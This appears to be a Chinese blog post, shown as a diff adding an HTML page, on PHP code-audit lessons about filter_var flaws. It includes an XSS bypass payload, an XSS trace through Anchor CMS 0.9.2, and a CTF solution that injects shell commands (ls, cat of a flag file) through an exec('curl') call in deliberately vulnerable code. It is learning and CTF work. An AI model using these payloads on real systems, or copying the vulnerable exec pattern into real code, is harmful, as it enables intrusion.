@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang=>
+  <head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="">
+  <meta name="keywords" content="root">
+  
+    <link rel="icon" href="/favicon.ico">
+  
+    
+  <title>依葫芦画瓢之filter_var函数缺陷 | The clown is laughing at you</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class="logo" href="/">
+      <span>The clown is laughing at you</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id="post">
+  <div class="content">
+    <article>
+        <section class="content markdown-body">
+          <h1>依葫芦画瓢之filter_var函数缺陷</h1>
+          <div class="post-meta">
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019/06/07</time>
+            
+            
+          </div>
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>跟着张师傅学习代码审计，依葫芦画瓢，偷瞄大佬博客，跟着学习</p>
+<p>这次是函数filter_var缺陷</p>
+<h1 id="上代码"><a href="#上代码" class="headerlink" title="上代码"></a>上代码</h1><p>参考链接：<br><a href="https://zhzhdoai.github.io/2019/06/02/RIPS-2-filter-vat%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5" target="_blank" rel="noopener">RIPS[2] | filter_var函数缺陷</a><br><a href="https://mochazz.github.io/2018/07/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Day2%20-%20filter_var%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7/" target="_blank" rel="noopener">代码审计Day2 - filter_var函数缺陷</a></p>
+<p><img src="/2019/06/07/依葫芦画瓢之filter-var函数缺陷/依葫芦画瓢之filter_var函数缺陷/1.png" alt=""><br>本题考察XSS漏洞。<br>然后这道题中，我们可以看到代码中使用到PHP的一个模块<a href="https://twig.symfony.com/" target="_blank" rel="noopener">Twig</a>.<br>调用了escape方法，，首先<a href="https://twig.symfony.com/doc/2.x/filters/escape.html" target="_blank" rel="noopener">escape过滤器</a>,是用PHP内置函数 htmlspecialchars 来实现的.</p>
+<p><strong>htmlspecialchars 函数定义如下：</strong></p>
+<p>htmlspecialchars ：(PHP 4, PHP 5, PHP 7)</p>
+<p>功能 ：将特殊字符转换为 HTML 实体</p>
+<p>定义 ：string htmlspecialchars ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string$encoding = ini_get(“default_charset”) [, bool $double_encode = TRUE ]]] )</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; &amp; (&amp; 符号)  ===============  &amp;amp;</span><br><span class="line">&gt; <span class="string">" (双引号)  ===============  &amp;quot;</span></span><br><span class="line"><span class="string">&gt; ' (单引号)  ===============  &amp;apos;</span></span><br><span class="line"><span class="string">&gt; &lt; (小于号)  ===============  &amp;lt;</span></span><br><span class="line"><span class="string">&gt; &gt; (大于号)  ===============  &amp;gt;</span></span><br><span class="line"><span class="string">&gt;</span></span><br></pre></td></tr></table></figure>
+<p>接着代码中又使用了<a href="http://www.w3school.com.cn/php/func_filter_var.asp" target="_blank" rel="noopener"><strong>filter_var()</strong></a>对其进行二次过滤<br>用了 FILTER_VALIDATE_URL 过滤器来判断是否是一个合法的url。</p>
+<p>对于以上代码，可以理解为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">  $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">  $url = htmlspecialchars($url);</span><br><span class="line">  var_dump($url);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  $url = filter_var($url,FILTER_VALIDATE_URL);</span><br><span class="line">  var_dump($url);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;a href='$url'&gt;Next slide &gt;&gt;&lt;/a&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这里的两个过滤器，我们可以通过javascript伪协议就绕过<br>构造payload:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url = javascrpit://comment://%250aalert(1);</span><br></pre></td></tr></table></figure></p>
+<p><strong><br>注意：’//‘在JS中是注释的作用，所以我们引入’%0a’,进行换行操作，而这里我们需要先将’%’编码为’%25’，<br>因为当我们发送payload时，后台代码会先将’%25’解析为’%’,再到浏览器解析时，就为’%’
+</strong><br><img src="/2019/06/07/依葫芦画瓢之filter-var函数缺陷/依葫芦画瓢之filter_var函数缺陷/2.png" alt=""></p>
+<h1 id="CMS小试"><a href="#CMS小试" class="headerlink" title="CMS小试"></a>CMS小试</h1><p>审计代码<strong>anchor.0.9.2</strong></p>
+<p>代码文件：themes/default/404.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> theme_include(<span class="string">'header'</span>); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">	&lt;section class="content wrap"&gt;</span><br><span class="line">		&lt;h1&gt;Page not found&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">		&lt;p&gt;Unfortunately, the page &lt;code&gt;/<span class="meta">&lt;?php</span> <span class="keyword">echo</span> current_url(); <span class="meta">?&gt;</span>&lt;/code&gt; could not be found. Your best bet is either to <span class="keyword">try</span> the &lt;a href=<span class="string">"&lt;?php echo base_url(); ?&gt;"</span>&gt;homepage&lt;/a&gt;, <span class="keyword">try</span> &lt;a href=<span class="string">"#search"</span>&gt;searching&lt;/a&gt;, <span class="keyword">or</span> go <span class="keyword">and</span> cry in a corner (although I don’t recommend the latter).&lt;/p&gt;</span><br><span class="line">	&lt;/section&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> theme_include(<span class="string">'footer'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>当我们访问一个不存在的页面时，就会调用404.php,<br>其中关键代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> current_url(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>跟踪到<br>代码文件：anchor/functions/helpers.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">current_url</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> Uri::current();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>返回 Uri::current()</p>
+<p>跟踪到<br>代码文件：system/uri.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">current</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(is_null(<span class="keyword">static</span>::$current)) <span class="keyword">static</span>::$current = <span class="keyword">static</span>::detect();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">static</span>::$current;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>调用静态方法 delect()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">detect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// create a server object from global</span></span><br><span class="line">		$server = <span class="keyword">new</span> Server($_SERVER);</span><br><span class="line"></span><br><span class="line">		$try = <span class="keyword">array</span>(<span class="string">'REQUEST_URI'</span>, <span class="string">'PATH_INFO'</span>, <span class="string">'ORIG_PATH_INFO'</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">foreach</span>($try <span class="keyword">as</span> $method) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// make sure the server var exists and is not empty</span></span><br><span class="line">			<span class="keyword">if</span>($server-&gt;has($method) <span class="keyword">and</span> $uri = $server-&gt;get($method)) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="comment">// apply a string filter and make sure we still have somthing left</span></span><br><span class="line">				<span class="keyword">if</span>($uri = filter_var($uri, FILTER_SANITIZE_URL)) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="comment">// make sure the uri is not malformed and return the pathname</span></span><br><span class="line">					<span class="keyword">if</span>($uri = parse_url($uri, PHP_URL_PATH)) &#123;</span><br><span class="line">						<span class="keyword">return</span> <span class="keyword">static</span>::format($uri, $server);</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					<span class="comment">// woah jackie, we found a bad'n</span></span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> ErrorException(<span class="string">'Malformed URI'</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
+<p>遍历 $try 中的键名，获取该键的键值<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($server-&gt;has($method) <span class="keyword">and</span> $uri = $server-&gt;get($method))</span><br></pre></td></tr></table></figure></p>
+<p>进行三次过滤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$uri = filter_var(rawurldecode($uri), FILTER_SANITIZE_URL);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// remove script path/name</span></span><br><span class="line">$uri = <span class="keyword">static</span>::remove_script_name($uri, $server);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// remove the relative uri</span></span><br><span class="line">$uri = <span class="keyword">static</span>::remove_relative_uri($uri);</span><br></pre></td></tr></table></figure></p>
+<p>其过滤方法如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span><span class="params">($value, $uri)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// make sure our search value is a non-empty string</span></span><br><span class="line">		<span class="keyword">if</span>(is_string($value) <span class="keyword">and</span> strlen($value)) &#123;</span><br><span class="line">			<span class="comment">// if the search value is at the start sub it out</span></span><br><span class="line">			<span class="keyword">if</span>(strpos($uri, $value) === <span class="number">0</span>) &#123;</span><br><span class="line">				$uri = substr($uri, strlen($value));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> $uri;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Remove the SCRIPT_NAME from the uri path</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">remove_script_name</span><span class="params">($uri, $server)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">static</span>::remove($server-&gt;get(<span class="string">'SCRIPT_NAME'</span>), $uri);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Remove the relative path from the uri set in the application config</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">remove_relative_uri</span><span class="params">($uri)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// remove base url</span></span><br><span class="line">		<span class="keyword">if</span>($base = Config::app(<span class="string">'url'</span>)) &#123;</span><br><span class="line">			$uri = <span class="keyword">static</span>::remove(rtrim($base, <span class="string">'/'</span>), $uri);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// remove index</span></span><br><span class="line">		<span class="keyword">if</span>($index = Config::app(<span class="string">'index'</span>)) &#123;</span><br><span class="line">			$uri = <span class="keyword">static</span>::remove(<span class="string">'/'</span> . $index, $uri);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> $uri;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>其中并没有对xss漏洞的攻击进行过滤<br>直接构造payload如下：<br><img src="/2019/06/07/依葫芦画瓢之filter-var函数缺陷/依葫芦画瓢之filter_var函数缺陷/3.png" alt=""></p>
+<h1 id="CTF小试"><a href="#CTF小试" class="headerlink" title="CTF小试"></a>CTF小试</h1><p>环境搭建：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">\\index.php</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    $site_info = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/sec-redclub.com$/'</span>,$site_info[<span class="string">'host'</span>]))&#123;</span><br><span class="line">        exec(<span class="string">'curl "'</span>.$site_info[<span class="string">'host'</span>].<span class="string">'"'</span>, $result);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info['host']&#125; successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows='20' cols='90'&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> implode(<span class="string">' '</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\\flag3Ejasf.php	</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">   $flag = <span class="string">"you are right"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这道题中，index.php中有两个过滤器，一个是filter_var()，一个是parse_url,获取host正则检验，<br>这里考察命令执行漏洞，关键代码为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">'curl "'</span>.$site_info[<span class="string">'host'</span>].<span class="string">'"'</span>, $result);</span><br></pre></td></tr></table></figure></p>
+<p>这是外部代码执行函数，看着这样子，我们是要构造的payload是要能闭合无用的字段‘“’；还要能执行代码，这里使用”;“加入我们想要执行的代码，最后payload还要以”sec-redclub.com“结尾。<br>先绕过filter_var()函数,构造payload：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=demo://demo@sec-redclub.com</span><br></pre></td></tr></table></figure></p>
+<p>然后综上所述,构造payload：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=demo://demo@";ls;"sec-redclub.com</span><br></pre></td></tr></table></figure></p>
+<p>获取当前文件目录flag3Ejasf.php index.php</p>
+<p>然后获取flag，构造payload:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=demo://demo@";cat&lt;flag3Ejasf.php;"sec-redclub.com</span><br></pre></td></tr></table></figure></p>
+<p>由此解出该题</p>
+
+        </section>
+    </article>
+    
+        <!-- disqus 评论框 start -->
+        <div class="comment">
+            <div id="disqus_thread" class="disqus-thread">
+              <i>Loading comments box needs to over the wall</i>
+            </div>
+        </div>
+        <!-- disqus 评论框 end -->
+    
+    
+        <!-- livere 评论框 start -->
+        <div class="comment">
+            <div id="lv-container" data-id="city" data-uid="your_livere_uid"></div>
+        </div>
+        <!-- livere 评论框 end -->
+        
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#上代码"><span class="toc-number">2.</span> <span class="toc-text">上代码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CMS小试"><span class="toc-number">3.</span> <span class="toc-text">CMS小试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF小试"><span class="toc-number">4.</span> <span class="toc-text">CTF小试</span></a></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<!-- disqus 公共JS代码 -->
+<script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES * * */
+  var disqus_shortname = "your_disqus_shortname";
+  var disqus_identifier = "http://yoursite.com/2019/06/07/依葫芦画瓢之filter-var函数缺陷/";
+  var disqus_url = "http://yoursite.com/2019/06/07/依葫芦画瓢之filter-var函数缺陷/";
+
+  isAgent(getDisqus)
+
+  // determine user agent in China
+  function isAgent(cb) {
+    var url = '//graph.facebook.com/feed?callback=h';
+    var xhr = new XMLHttpRequest();
+    var called = false;
+    xhr.open('GET', url);
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+      called = true;
+      cb(true);
+      }
+    };
+    xhr.send();
+    // timeout 1s, this facebook API is very fast.
+    setTimeout(function() {
+      if (!called) {
+      xhr.abort();
+      cb(false)
+      }
+    }, 1000);
+  }
+
+  function getDisqus(isAgent) {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; 
+    dsq.async = true
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq)
+  }
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+<script type="text/javascript">
+  (function(d, s) {
+      var j, e = d.getElementsByTagName(s)[0];
+
+      if (typeof LivereTower === 'function') { return; }
+
+      j = d.createElement(s);
+      j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+      j.async = true;
+
+      e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+</body>
+</html>
